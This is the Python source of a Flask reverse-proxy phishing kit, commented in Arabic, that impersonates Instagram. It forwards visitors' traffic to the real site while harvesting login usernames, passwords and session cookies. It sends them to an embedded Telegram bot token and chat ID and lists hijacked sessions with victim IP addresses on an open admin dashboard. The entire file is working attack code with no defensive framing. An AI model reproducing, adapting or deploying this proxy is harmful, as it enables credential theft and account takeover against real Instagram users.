from flask import Flask, request, make_response, redirect, url_for, after_this_request
import requests
import logging
import json
from datetime import datetime
import os
import urllib3
from urllib.parse import urlparse, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

captured_sessions = {}  # لتخزين الجلسات في لوحة التحكم

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        logging.error(f"Telegram error: {e}")

def extract_login_credentials(data):
    """محاولة استخراج اسم المستخدم وكلمة المرور من JSON"""
    credentials = {}
    if isinstance(data, dict):
        if 'username' in data:
            credentials['username'] = data['username']
        if 'enc_password' in data:
            credentials['enc_password'] = data['enc_password']
        if 'password' in data:
            credentials['password'] = data['password']
        if 'email' in data:
            credentials['email'] = data['email']
    return credentials

def is_login_path(path):
    """تحديد ما إذا كان المسار هو مسار تسجيل دخول"""
    login_paths = ['/api/v1/web/accounts/login/', '/accounts/login/ajax/', '/login/']
    return any(p in path for p in login_paths)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def proxy(path):
    # بناء عنوان الهدف
    target_domain = 'www.instagram.com'
    target_url = f'https://{target_domain}/{path}'
    if request.query_string:
        target_url += '?' + request.query_string.decode('utf-8')

    # نقل جميع الرؤوس مع تعديل Host فقط
    headers = dict(request.headers)
    headers['Host'] = target_domain

    # إزالة بعض الرؤوس التي قد تسبب مشاكل
    headers.pop('Content-Length', None)
    headers.pop('Connection', None)

    # نقل جميع الكوكيز من الطلب
    cookies = request.cookies

    # الحصول على بيانات الطلب
    data = request.get_data()

    captured_creds = None
    # إذا كان الطلب POST ومسار تسجيل دخول، نحاول التقاط بيانات الدخول
    if request.method == 'POST' and is_login_path(path):
        content_type = request.headers.get('Content-Type', '')
        if 'application/json' in content_type:
            try:
                json_data = request.get_json(silent=True) or {}
                captured_creds = extract_login_credentials(json_data)
                if captured_creds:
                    logging.info(f"Captured login credentials: {captured_creds}")
                    # إرسال إشعار بسيط
                    msg = (f"🔐 <b>Login Credentials Captured</b>\n"
                           f"<pre>{json.dumps(captured_creds, indent=2)}</pre>")
                    send_telegram_message(msg)
            except:
                pass

    try:
        # إرسال الطلب إلى الهدف
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            cookies=cookies,
            data=data,
            allow_redirects=False,
            verify=False,
            timeout=30
        )

        # بناء استجابة Flask
        proxy_response = make_response(resp.content)
        proxy_response.status_code = resp.status_code

        # نقل الرؤوس (مع استثناء بعضها)
        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
        for key, value in resp.headers.items():
            if key.lower() not in excluded_headers:
                proxy_response.headers[key] = value

        # نقل الكوكيز من الاستجابة إلى العميل
        for cookie_name, cookie_value in resp.cookies.items():
            proxy_response.set_cookie(cookie_name, cookie_value, domain=request.host, secure=True, httponly=True, samesite='Lax')

        # التحقق من وجود كوكيز جلسة صالحة
        if resp.cookies:
            cookies_dict = resp.cookies.get_dict()
            # إذا وجدنا sessionid، هذه جلسة صالحة
            if 'sessionid' in cookies_dict:
                session_id = datetime.now().strftime("%y%m%d_%H%M%S")
                captured_sessions[session_id] = {
                    'site': 'Instagram',
                    'cookies': cookies_dict,
                    'timestamp': str(datetime.now()),
                    'ip': request.remote_addr
                }
                # إرسال إشعار بالجلسة
                important_cookies = {k: v for k, v in cookies_dict.items() if k in ['sessionid', 'ds_user_id', 'csrftoken']}
                msg = (f"🔥 <b>Valid Session Hijacked!</b>\n"
                       f"🆔 <b>Session ID:</b> <code>{session_id}</code>\n"
                       f"🍪 <b>Cookies:</b>\n<pre>{json.dumps(important_cookies, indent=2)}</pre>\n"
                       f"🔗 <b>Dashboard:</b> https://{request.host}/admin/dashboard")
                send_telegram_message(msg)
                logging.info(f"Valid session captured: {session_id}")

        # معالجة التوجيه (redirects)
        if resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location', '')
            if location:
                parsed = urlparse(location)
                if 'instagram.com' in parsed.netloc:
                    # استبدال النطاق بنطاقنا
                    new_location = location.replace(parsed.netloc, request.host)
                    proxy_response.headers['Location'] = new_location

        return proxy_response

    except Exception as e:
        logging.error(f"Proxy error: {str(e)}")
        return f"Service Unavailable", 503

# مسارات لوحة التحكم
@app.route('/admin/dashboard')
def admin_dashboard():
    try:
        sessions_list = []
        for sid, data in captured_sessions.items():
            sessions_list.append({
                'id': sid,
                'site': data['site'],
                'cookies_count': len(data['cookies']),
                'timestamp': data['timestamp'],
                'ip': data['ip']
            })
        # عرض بسيط (يمكنك تحسينه لاحقاً)
        html = "<h1>Captured Sessions</h1><ul>"
        for s in sessions_list:
            html += f"<li><b>{s['id']}</b> - {s['site']} - {s['cookies_count']} cookies - {s['timestamp']} - {s['ip']} <a href='/admin/session/{s['id']}'>View</a></li>"
        html += "</ul><a href='/admin/clear'>Clear All</a>"
        return html
    except Exception as e:
        return f"Dashboard Error: {str(e)}", 500

@app.route('/admin/session/<session_id>')
def get_session(session_id):
    if session_id in captured_sessions:
        return make_response(json.dumps(captured_sessions[session_id], indent=2), 200, {'Content-Type': 'application/json'})
    return "Session not found", 404

@app.route('/admin/clear')
def clear_sessions():
    captured_sessions.clear()
    return redirect(url_for('admin_dashboard'))

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
